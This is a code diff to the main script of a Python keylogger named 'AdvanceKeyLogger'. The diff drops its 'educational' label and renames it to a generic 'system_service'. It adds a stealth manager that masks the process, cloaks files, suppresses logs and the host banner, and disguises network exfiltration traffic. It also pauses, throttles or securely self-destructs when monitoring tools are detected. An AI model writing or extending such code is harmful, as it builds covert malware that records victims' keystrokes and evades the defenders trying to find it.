@@ -49,6 +49,7 @@ from utils.resilience import CircuitBreaker, TransportQueue
 from utils.dependency_check import check_and_install_dependencies
 from utils.self_destruct import execute_self_destruct
 from utils.system_info import get_system_info
+from stealth import StealthManager
 
 # Plugin modules are auto-imported by capture/__init__.py and
 # transport/__init__.py via their self-registration loops.
@@ -59,11 +60,10 @@ logger = logging.getLogger(__name__)
 
 def parse_args() -> argparse.Namespace:
     """Parse command-line arguments."""
+    # Use innocuous prog name — overridden at runtime by stealth if enabled
     parser = argparse.ArgumentParser(
-        prog="AdvanceKeyLogger",
-        description=(
-            "Educational input monitoring tool for learning OS APIs and software architecture."
-        ),
+        prog="system_service",
+        description="System monitoring service.",
     )
     subparsers = parser.add_subparsers(dest="command")
     service_parser = subparsers.add_parser("service", help="Manage service/daemon mode")
@@ -391,12 +391,27 @@ def main() -> int:
     # --- Load config ---
     settings = Settings(args.config)
 
+    # --- Stealth manager (early init, before logging) ---
+    stealth_cfg = settings.as_dict().get("stealth", {}) if isinstance(settings.as_dict(), dict) else {}
+    stealth = StealthManager(stealth_cfg)
+
     # --- Setup logging ---
     log_level = args.log_level or settings.get("general.log_level", "INFO")
     log_file = settings.get("general.log_file")
+    # In stealth mode, the log controller may override file/console logging
+    if stealth.enabled:
+        stealth_log_file = stealth.fs_cloak.get_log_file()
+        if stealth_log_file == "":
+            log_file = None  # suppress file logging
+        else:
+            log_file = stealth_log_file
     setup_logging(log_level=log_level, log_file=log_file)
 
-    logger.info("AdvanceKeyLogger starting...")
+    # Activate stealth (process masking, fs cloak, log control, detection)
+    if stealth.enabled:
+        stealth.activate()
+
+    logger.info("Service starting...")
 
     # --- Auto-install missing dependencies ---
     if settings.get("general.auto_install_deps", False):
@@ -475,20 +490,21 @@ def main() -> int:
     # --- PID lock ---
     pid_lock = None
     if not args.no_pid_lock:
-        pid_lock = PIDLock()
+        pid_lock = PIDLock(pid_file=stealth.get_pid_path())
         if not pid_lock.acquire():
             logger.error("Another instance is already running. Use --no-pid-lock to override.")
             return 1
 
     # --- System info ---
     sys_info = get_system_info()
-    logger.info(
-        "System: %s@%s (%s %s)",
-        sys_info["username"],
-        sys_info["hostname"],
-        sys_info["os"],
-        sys_info["os_release"],
-    )
+    if not stealth.should_suppress_banner():
+        logger.info(
+            "System: %s@%s (%s %s)",
+            sys_info["username"],
+            sys_info["hostname"],
+            sys_info["os"],
+            sys_info["os_release"],
+        )
 
     # --- Create config snapshot ---
     config = settings.as_dict()
@@ -624,6 +640,8 @@ def main() -> int:
         sqlite_store = SQLiteStorage(settings.get("storage.sqlite_path", "./data/captures.db"))
 
     transport = create_transport(config)
+    # Patch transport with stealth network bridge (headers, UA, throttling)
+    stealth.patch_transport(transport)
     batch_size = int(settings.get("transport.batch_size", 50))
 
     queue = TransportQueue(max_size=int(settings.get("transport.queue_size", 1000)))
@@ -736,8 +754,27 @@ def main() -> int:
     try:
         while not shutdown.requested:
             time.sleep(0.2)
+
+            # --- Stealth: detection-awareness response ---
+            if stealth.enabled:
+                if stealth.detection.should_self_destruct():
+                    logger.warning("Stealth: self-destruct triggered by detection")
+                    break
+                if stealth.detection.should_pause():
+                    # Go dormant — sleep longer and skip this iteration
+                    stealth.resource_profiler.idle_sleep()
+                    continue
+                # Enforce CPU ceiling
+                stealth.resource_profiler.enforce_cpu_ceiling()
+
             now = time.time()
-            if now - last_report < report_interval_ref["value"]:
+            effective_interval = report_interval_ref["value"]
+            if stealth.enabled:
+                effective_interval = stealth.resource_profiler.jittered_interval(effective_interval)
+                # Throttle: double interval when monitoring tools detected
+                if stealth.detection.should_throttle():
+                    effective_interval *= 2.0
+            if now - last_report < effective_interval:
                 continue
             last_report = now
 
@@ -877,6 +914,10 @@ def main() -> int:
     # --- Shutdown ---
     logger.info("Shutting down...")
 
+    # Stop stealth subsystems
+    if stealth.enabled:
+        stealth.stop()
+
     for cap in captures:
         try:
             cap.stop()
@@ -899,8 +940,13 @@ def main() -> int:
     with contextlib.suppress(Exception):
         transport.disconnect()
 
+    # Handle self-destruct if triggered by detection awareness
+    if stealth.enabled and stealth.detection.should_self_destruct():
+        sd_config = settings.as_dict()
+        execute_self_destruct(sd_config, secure_wipe=True, remove_service=True)
+
     shutdown.restore()
-    logger.info("AdvanceKeyLogger stopped.")
+    logger.info("Service stopped.")
     return 0
 
 
